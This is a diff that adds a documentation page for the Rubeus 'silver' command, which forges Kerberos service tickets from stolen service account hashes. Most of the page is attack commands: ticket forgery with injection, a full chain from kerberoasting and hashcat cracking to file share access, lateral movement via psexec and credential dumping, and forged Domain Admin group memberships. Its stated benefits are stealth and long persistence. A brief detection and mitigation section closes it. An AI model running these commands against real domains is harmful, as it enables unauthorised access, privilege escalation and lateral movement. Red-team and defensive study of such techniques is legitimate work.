@@ -1,0 +1,320 @@
+---
+title: 'silver'
+description: 'Forge silver tickets for specific services using service account credentials'
+icon: 'medal'
+sidebarTitle: 'silver'
+---
+
+## Overview
+
+Create silver tickets (forged TGS tickets) for specific services using service account credentials. Silver tickets provide direct access to individual services without requiring domain controller interaction, making them useful for stealth operations and service-specific access.
+
+## Syntax
+
+```bash
+Rubeus.exe silver /user:USER /service:SPN /rc4:HASH [options]
+```
+
+## Required Parameters
+
+<ParamField path="user" type="string" required>
+  Username for the forged ticket
+</ParamField>
+
+<ParamField path="service" type="string" required>
+  Service Principal Name (SPN) to target
+</ParamField>
+
+## Credential Parameters (Choose One)
+
+<ParamField path="rc4" type="string">
+  RC4/NTLM hash of the service account
+</ParamField>
+
+<ParamField path="aes128" type="string">
+  AES128 key of the service account
+</ParamField>
+
+<ParamField path="aes256" type="string">
+  AES256 key of the service account
+</ParamField>
+
+## Optional Parameters
+
+<ParamField path="domain" type="string">
+  Domain for the ticket (default: current domain)
+</ParamField>
+
+<ParamField path="sid" type="string">
+  Domain SID for the ticket
+</ParamField>
+
+<ParamField path="groups" type="string">
+  Comma-separated list of group RIDs (default: 513,512,520,518,519)
+</ParamField>
+
+<ParamField path="starttime" type="string">
+  Ticket start time (default: now)
+</ParamField>
+
+<ParamField path="endtime" type="string">
+  Ticket end time (default: 10 years)
+</ParamField>
+
+<ParamField path="renew" type="string">
+  Ticket renew time (default: 10 years)
+</ParamField>
+
+<ParamField path="outfile" type="string">
+  Save ticket to file
+</ParamField>
+
+<ParamField path="ptt" type="boolean">
+  Pass-the-ticket (inject immediately)
+</ParamField>
+
+## Examples
+
+<CodeGroup>
+```bash Basic Silver Tickets
+# Create CIFS silver ticket
+Rubeus.exe silver /user:admin /service:cifs/fileserver.corp.local /rc4:service_ntlm_hash /ptt
+
+# Create HOST silver ticket for remote admin
+Rubeus.exe silver /user:admin /service:host/target.corp.local /rc4:machine_hash
+
+# Create HTTP silver ticket
+Rubeus.exe silver /user:admin /service:http/webapp.corp.local /aes256:service_aes_key
+```
+
+```bash Advanced Configuration
+# Custom domain and SID
+Rubeus.exe silver /user:admin /service:cifs/server.corp.local /rc4:hash /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890
+
+# Custom groups and timing
+Rubeus.exe silver /user:admin /service:mssql/dbserver.corp.local /rc4:hash /groups:512,513,518 /endtime:"12/31/2025 23:59:59"
+
+# Save to file for later use
+Rubeus.exe silver /user:admin /service:ldap/dc.corp.local /aes128:key /outfile:ldap_silver.kirbi
+```
+</CodeGroup>
+
+## Service Targeting
+
+<Accordion title="Common Service Types">
+  **File Services (CIFS):**
+  ```bash
+  # File server access
+  Rubeus.exe silver /user:admin /service:cifs/fileserver.corp.local /rc4:hash /ptt
+
+  # Test access
+  dir \\fileserver.corp.local\c$
+  ```
+
+  **Remote Administration (HOST):**
+  ```bash
+  # Administrative access
+  Rubeus.exe silver /user:admin /service:host/target.corp.local /rc4:hash /ptt
+
+  # Remote execution
+  psexec \\target.corp.local cmd
+  ```
+
+  **Database Access (MSSQL):**
+  ```bash
+  # SQL Server access
+  Rubeus.exe silver /user:admin /service:mssql/sqlserver.corp.local /rc4:hash /ptt
+
+  # Connect to database
+  sqlcmd -S sqlserver.corp.local -E
+  ```
+</Accordion>
+
+<Accordion title="Service Account Requirements">
+  **Hash Acquisition:**
+  - Service account NTLM hash (RC4)
+  - Service account AES keys (AES128/256)
+  - Computer account credentials for machine services
+  - Manual hash extraction from compromised systems
+
+  **Service Types:**
+  - User service accounts (custom applications)
+  - Machine accounts (computer services)
+  - Managed service accounts (MSAs)
+  - Group managed service accounts (gMSAs)
+</Accordion>
+
+## Silver Ticket Advantages
+
+<Accordion title="Operational Benefits">
+  **Stealth Characteristics:**
+  - No domain controller communication required
+  - Direct service authentication
+  - Bypasses many detection mechanisms
+  - Reduced network traffic and logs
+
+  **Persistence:**
+  - Long validity periods (up to 10 years)
+  - Survives password changes (until service key rotation)
+  - Independent of domain controller availability
+  - Resilient to many defensive measures
+</Accordion>
+
+<Accordion title="Technical Advantages">
+  **Service-Specific Access:**
+  - Targeted service authentication
+  - Precise permission control
+  - Minimal privilege exposure
+  - Focused attack scope
+
+  **Flexibility:**
+  - Custom user identity
+  - Configurable group memberships
+  - Adjustable validity periods
+  - Multiple encryption types
+</Accordion>
+
+## Credential Acquisition
+
+<Accordion title="Service Account Hashes">
+  **Common Sources:**
+  - Kerberoasting attacks (service accounts)
+  - Memory dumps from compromised systems
+  - DCSync attacks for computer accounts
+  - Cached credential extraction
+
+  **Hash Types:**
+  ```bash
+  # RC4/NTLM hash (most common)
+  Rubeus.exe silver /service:cifs/server.corp.local /rc4:32ed87bdb5fdc5e9cba88547376818d4
+
+  # AES256 key (stronger encryption)
+  Rubeus.exe silver /service:cifs/server.corp.local /aes256:32ed87bdb5fdc5e9cba88547376818d4...
+
+  # AES128 key
+  Rubeus.exe silver /service:cifs/server.corp.local /aes128:32ed87bdb5fdc5e9cba88547376818d4
+  ```
+</Accordion>
+
+<Accordion title="Machine Account Credentials">
+  **Computer Account Access:**
+  - Local computer account hash extraction
+  - Registry-based credential recovery
+  - Memory-based hash extraction
+  - Network capture and analysis
+
+  **Service Integration:**
+  ```bash
+  # HOST service for administrative access
+  Rubeus.exe silver /user:admin /service:host/target.corp.local /rc4:machine_hash
+
+  # CIFS service for file access
+  Rubeus.exe silver /user:admin /service:cifs/target.corp.local /rc4:machine_hash
+  ```
+</Accordion>
+
+## Integration Workflows
+
+<Accordion title="Post-Kerberoasting">
+  **Complete Attack Chain:**
+  ```bash
+  # 1. Kerberoast service accounts
+  Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
+
+  # 2. Crack service account hashes
+  hashcat -m 13100 kerberoast_hashes.txt wordlist.txt
+
+  # 3. Create silver tickets with cracked hashes
+  Rubeus.exe silver /user:admin /service:cifs/fileserver.corp.local /rc4:cracked_hash /ptt
+
+  # 4. Access target services
+  dir \\fileserver.corp.local\share
+  ```
+</Accordion>
+
+<Accordion title="Lateral Movement">
+  **Service-Hopping Strategy:**
+  ```bash
+  # 1. Create HOST ticket for remote admin
+  Rubeus.exe silver /user:admin /service:host/target1.corp.local /rc4:hash /ptt
+
+  # 2. Execute on target1
+  psexec \\target1.corp.local cmd
+
+  # 3. Extract credentials from target1
+  # Dump hashes, tickets, or other credentials
+
+  # 4. Create new silver tickets for additional targets
+  Rubeus.exe silver /user:admin /service:cifs/target2.corp.local /rc4:new_hash /ptt
+  ```
+</Accordion>
+
+## Group Configuration
+
+<Accordion title="Default Groups">
+  **Standard Group RIDs:**
+  - 513: Domain Users
+  - 512: Domain Admins
+  - 520: Group Policy Creator Owners
+  - 518: Schema Admins
+  - 519: Enterprise Admins
+
+  **Practical Impact:**
+  - Domain Admins (512) provides broad administrative access
+  - Enterprise Admins (519) for forest-wide operations
+  - Custom groups for specific service permissions
+</Accordion>
+
+<Accordion title="Custom Group Targeting">
+  **Service-Specific Groups:**
+  ```bash
+  # Database administrators group
+  Rubeus.exe silver /user:admin /service:mssql/db.corp.local /rc4:hash /groups:512,513,1001
+
+  # Application-specific groups
+  Rubeus.exe silver /user:admin /service:http/app.corp.local /rc4:hash /groups:513,1500,1501
+  ```
+
+  **Group Discovery:**
+  - LDAP enumeration for service-specific groups
+  - Analysis of service permissions and ACLs
+  - Review of application-specific role memberships
+  - Custom group identification through reconnaissance
+</Accordion>
+
+## Defensive Considerations
+
+<Accordion title="Detection Challenges">
+  **Limited Visibility:**
+  - No KDC interaction for validation
+  - Standard service authentication patterns
+  - Difficult to distinguish from legitimate tickets
+  - Minimal unusual network activity
+
+  **Detection Opportunities:**
+  - Unusual service access patterns
+  - Access from unexpected accounts
+  - Service tickets with suspicious characteristics
+  - Correlation with other attack indicators
+</Accordion>
+
+<Accordion title="Mitigation Strategies">
+  **Technical Controls:**
+  - Regular service account key rotation
+  - Enhanced service authentication logging
+  - Privileged account monitoring
+  - Service permission auditing
+
+  **Operational Measures:**
+  - Regular security assessments
+  - Service account management procedures
+  - Monitoring for unusual service access
+  - Incident response planning
+</Accordion>
+
+## Related Commands
+
+- [`kerberoast`](/commands/roasting/kerberoast) - Extract service account hashes
+- [`golden`](/commands/forgery/golden) - Domain-wide ticket forgery
+- [`ptt`](/commands/management/ptt) - Inject forged tickets
+- [`describe`](/commands/management/describe) - Analyze forged tickets
